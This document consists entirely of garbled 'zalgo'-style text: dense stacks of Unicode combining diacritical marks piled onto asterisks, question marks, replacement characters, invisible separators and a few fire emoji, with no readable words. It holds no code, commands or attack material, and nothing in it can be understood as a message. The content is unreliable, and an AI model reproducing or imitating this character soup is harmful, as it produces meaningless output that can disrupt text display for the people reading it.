̛͇̻̬̥̓̂̿̆̾̔̊̓̒͂̊͂�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴͋̐̔̂̇̒̑̅͘͝